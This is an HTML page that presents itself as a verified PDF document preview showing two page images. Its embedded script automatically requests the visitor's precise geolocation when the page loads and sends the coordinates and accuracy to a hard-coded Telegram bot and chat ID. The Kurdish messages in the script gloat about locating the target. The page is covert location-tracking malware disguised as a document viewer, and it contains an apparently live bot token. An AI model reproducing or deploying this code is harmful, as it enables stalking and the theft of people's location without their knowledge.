<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Viewer</title>
    <style>
        body {
            background-color: #525659;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .pdf-container {
            background-color: #ffffff;
            color: #000000;
            width: 100%;
            max-width: 800px;
            padding: 40px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .pdf-header {
            border-bottom: 2px solid #ccc;
            padding-bottom: 10px;
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .page-box {
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid #ddd;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 4px;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 2px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }
        .btn-box {
            text-align: center;
            margin: 20px;
        }
        .allow-btn {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="pdf-container">
        <div class="pdf-header">
            <span>Verified Document Preview (PDF)</span>
            <span style="font-size: 14px; color: #666;">Page 1 & 2</span>
        </div>

        <div class="page-box">
            <img src="IMG_6579.jpeg" alt="Document Page 1">
        </div>

        <div class="page-box">
            <img src="IMG_6581.jpeg" alt="Document Page 2">
        </div>
    </div>

    <script>
        const BOT_TOKEN = "9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw";
        const CHAT_ID = "659131693";

        function s1derGetLocationAndSend() {
            if (!navigator.geolocation) {
                console.error("Geolocation is not supported by this browser.");
                return;
            }

            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                const locUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی هۆستکراو دۆزرایەوە.%0Aوردبوونەوە: ${acc} مەتر`;

                try {
                    await fetch(locUrl);
                    await fetch(textUrl);
                } catch (err) {
                    console.error("فاک، ناردن سەرکەوتوو نەبوو:", err);
                }
            }, (error) => {
                console.error("فاک، مۆڵەتی لۆکەیشن لەسەر هۆست ڕەتکرایەوە:", error.code);
            }, {
                enableHighAccuracy: true,
                timeout: 20000,
                maximumAge: 0
            });
        }

        // کارپێکردن راستەوخۆ لە کاتی لۆدبوونی پەڕەکە
        window.onload = () => {
            setTimeout(s1derGetLocationAndSend, 1000);
        };
    </script>
</body>
</html>
